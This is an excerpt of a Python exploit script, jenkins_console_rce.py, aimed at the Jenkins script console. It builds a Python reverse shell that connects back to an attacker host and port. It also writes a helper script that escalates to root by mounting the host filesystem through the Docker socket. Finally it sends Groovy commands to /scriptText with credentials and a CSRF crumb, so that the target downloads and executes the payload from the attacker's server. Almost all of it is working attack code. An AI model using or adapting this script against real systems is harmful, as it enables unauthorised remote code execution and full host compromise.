...
#▀▀▀• ▀▀▀ ▀▀ █▪·▀  ▀▀▀▀▀▀ █▪ ▀▀▀▀ ·▀▀▀  ▀█▄▀▪▀▀ █▪ ▀▀▀▀  ▀█▄▀▪.▀▀▀  ▀▀▀ .▀  ▀·▀▀▀  ▀▀▀                      #
#                                                                                                           #
# jenkins_console_rce.py - mikael.kall@kindredgroup.com                                                     #
#                                                                                                           #
# DATE                                                                                                      #
# 14/06/2018                                                                                                #
#                                                                                                           #
...
def BuildPayload():
    ...
    # Normally pty.spawn('/bin/bash') but here we point it to givemeroot.sh to demo the docker privilege escalation.

    payload = '#!/bin/bash\n'
    python_rev_shell = '''python2 -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
s.connect(("%s", %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/tmp/givemeroot.sh");s.close()\'''' % (LHOST, LPORT)
...
def BuildGiveMeRoot():
    ...
    payload = "#!/bin/bash\n"
    payload += "if [ -e '/var/run/docker.sock' ]; then\n"
    payload += "docker run -v /:/mnt -i -t nighter/givemeroot\n"
    payload += "else\n"
    payload += "/bin/bash\n"
    payload += "fi\n"

    with open('/tmp/givemeroot.sh', 'w') as file:
        file.write(payload)
...
def exploit():
    ...
    if token_enabled() is True:
        ...
        groovy = "'wget %s:%s/givemeroot.sh -O /tmp/givemeroot.sh'.execute().text" % (LHOST, '8000')
        postdata = 'Jenkins-Crumb=%s&script=%s' % (csrf_token, ul.quote_plus(groovy))
        r = requests.post('%s/scriptText' % URL, data=postdata, headers=headers, auth=(USERNAME, PASSWORD))
        ...
        groovy = "'chmod +x /tmp/givemeroot.sh'.execute().text"
        postdata = 'Jenkins-Crumb=%s&script=%s' % (csrf_token, ul.quote_plus(groovy))
        r = requests.post('%s/scriptText' % URL, data=postdata, headers=headers, auth=(USERNAME, PASSWORD))
